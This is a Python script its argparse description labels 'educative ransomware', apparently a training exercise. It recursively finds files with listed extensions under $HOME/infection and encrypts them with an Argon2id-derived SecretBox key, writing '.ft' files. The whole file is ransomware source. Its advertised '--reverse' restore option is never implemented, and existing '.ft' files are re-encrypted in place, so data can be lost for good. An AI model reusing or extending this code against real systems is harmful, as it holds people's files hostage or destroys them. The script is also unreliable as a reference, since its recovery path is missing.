import argparse
import os
import stat
import glob
import hashlib
import nacl as na
from nacl.secret import SecretBox
from nacl.pwhash import argon2id
from nacl.utils import random

def error(error_message:str):
    print("Error: " + error_message)
    exit(1)

def isreadable(filepath):
    st = os.stat(filepath)
    return bool(st.st_mode & stat.S_IRUSR)

def encryption(filepath, key):
    # Lire le fichier à chiffrer
    with open(filepath, "rb") as f:
        data = f.read()

    # Générer un salt
    salt = random(argon2id.SALTBYTES)

    # Dériver la clé crypto
    derived_key = argon2id.kdf(
        SecretBox.KEY_SIZE,
        key,
        salt,
        opslimit=argon2id.OPSLIMIT_MODERATE,
        memlimit=argon2id.MEMLIMIT_MODERATE,
    )

    box = SecretBox(derived_key)
    encrypted = box.encrypt(data)

    # Construction du nouveau nom de fichier
    if filepath.endswith(".ft"):
        output_path = filepath
    else:
        base, _ = os.path.splitext(filepath)
        output_path = base + ".ft"

    # Écriture : [salt][nonce + ciphertext + MAC]
    with open(output_path, "wb") as f:
        f.write(salt)
        f.write(encrypted)

    return output_path
#---------------argparse---------------#
parser = argparse.ArgumentParser(description="educative ransomware")
parser.add_argument("-v", "--version", action="version", version="1.0.0", help="display the version of the program")
parser.add_argument("-r", "--reverse", action="store_true", help="reverse the encryption to restore the encrypted files")
parser.add_argument("-s", "--silent", action="store_true", help="mute the program")

parser.add_argument("key_path", help="path to the key file", nargs="?", default=None)

args = parser.parse_args()

if args.key_path is None:
    error("path to the key is required as argument")
#---------------initialisation---------------#
extension_path = "extensions.txt"
key_path = args.key_path
target_dir = os.getenv("HOME", default="/home") + "/infection"
#---------------file extraction---------------#
extensions = []
if os.path.exists(key_path):
    if isreadable(key_path):
        with open(key_path, "rb") as f:
            key = f.read()
    else:
        error("User do not have read privilege for [" + key_path + "]")
else:
    error("File don't exist for [" + key_path + "]")
if os.path.exists(extension_path):
    with open(extension_path, "rt") as f:
        for line in f:
            extensions.append(line.strip())
else:
    error("can't find extension file")
extensions.append(".ft")
# ---------------glob recursive files retriever---------------#

files = []
for ext in extensions:
    pattern = os.path.join(target_dir, "**", f"*{ext}")
    files.extend(glob.glob(pattern, recursive=True))

for filepath in files:
    print(filepath)
    encryption(filepath, key)